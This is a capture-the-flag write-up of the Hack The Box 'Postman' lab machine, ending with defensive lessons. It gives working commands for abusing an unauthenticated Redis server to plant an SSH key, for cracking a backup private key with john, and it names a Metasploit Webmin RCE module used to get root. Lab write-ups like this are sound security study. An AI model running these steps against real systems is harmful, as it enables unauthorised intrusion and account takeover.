---
cover: ../.gitbook/assets/ChatGPT Image May 26, 2025, 08_39_31 AM.png
coverY: 0
---

# 🧠 Real-World Security Lessons from HTB’s Postman: Misconfig to Root📮

<div data-full-width="true"><figure><img src="../.gitbook/assets/ChatGPT Image May 26, 2025, 08_39_31 AM.png" alt=""><figcaption></figcaption></figure></div>

### 💡 Summary

Postman (Linux, Easy) brings together two beautiful classics: an unauthenticated Redis server and a Webmin 1.910 instance vulnerable to command injection. Add a dash of SSH key juggling, and we’ve got a shell delivery system.

### 🔍 Enumeration

#### ⚙️ Full Port Scan

```
nmap -n -p- -vvv --reason -oN nmap/01-full-port-scan.txt -iL target.txt
```

**Open Ports**

* 22 – SSH
* 80 – Apache 2.4.29
  *

      <figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
* 6379 – Redis 4.0.9 (no auth)
* 10000 – MiniServ 1.910 (Webmin)



#### 🧠 Service Enumeration

```
nmap -sC -A -O -sV -oN nmap/03-detail-scan.txt -p22,80,6379,10000 -iL target.txt
```

Discovered:

* **Webmin** running on MiniServ 1.910
* **Redis** unauthenticated
* **SSH** banner suggests Ubuntu
* Apache server hosting a personal website

🔎 Googled the following:

* Redis 4.0.9 RCE possibilities [link](https://d4luc1.medium.com/unauthenticated-redis-server-leads-to-rce-6c175c75b293)
* Webmin 1.910 exploit [Exploit-DB 46984](https://www.exploit-db.com/exploits/46984)



### 🛠️ Exploitation: Redis to Shell

**Generate SSH Key**

```
ssh-keygen -f postman
```

**Check for writable `.ssh` directory in Redis**

```
redis-cli -h 10.10.10.160
config set dir .ssh
config set dbfilename authorized_keys
```

**Inject Public Key**

```
(echo -e "\n\n"; cat postman.pub; echo -e "\n\n") > pub_key.txt
cat pub_key.txt | redis-cli -h 10.10.10.160 -x set exploit
save
```

**Login via SSH as redis**

```
ssh -i postman redis@10.10.10.160
```

### 🚪 Lateral Movement

Found `id_rsa.bak` in `/opt`:

```
scp redis@10.10.10.160:/opt/id_rsa.bak .
ssh2john id_rsa.bak > hash.john
john --wordlist=/usr/share/wordlists/rockyou.txt hash.john
```

🎯 **Password Cracked:** `computer2008`

* i tried to ssh into the box but i was not able to as Matt
  * so changed user using the redis shell

```
su Matt
```

### 📈 Privilege Escalation – Webmin RCE

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* When i try to login into web admin panel with Matt Creds i can get in
* metasploit has a module for exploit webadmin

```
linux/http/webmin_packageup_rce
```

* webadmin is running as root and hence after exploiting it get a shell as root

### 🧠 Key Learnings from HTB Postman

1. **Default Redis Misconfiguration Can Lead to Shell Access**\
   Misconfigured Redis instances without authentication allow attackers to write files like `authorized_keys`, leading to direct system access.
2. **Exposed Private Keys Are a Critical Risk**\
   Backup or misplaced private keys (`.bak` files) can be cracked and reused for lateral movement. Regular key audits and encryption hygiene are essential.
3. **Outdated Web Interfaces Like Webmin Pose Privilege Escalation Risks**\
   Webmin v1.910 contains a known RCE vulnerability, allowing remote root access via command injection. Patch management is non-negotiable.
4. **Credential Reuse Enables Account Traversal**\
   Reusing passwords across services (e.g., Redis to Webmin) facilitated lateral movement and elevation of privileges.
5. **Misconfigurations Chain into Full Compromise**\
   No single point of failure — rather, a chain of small missteps (open Redis, leaked key, outdated Webmin) led to complete root compromise.



{% embed url="https://www.hackthebox.com/achievement/machine/409699/215" %}
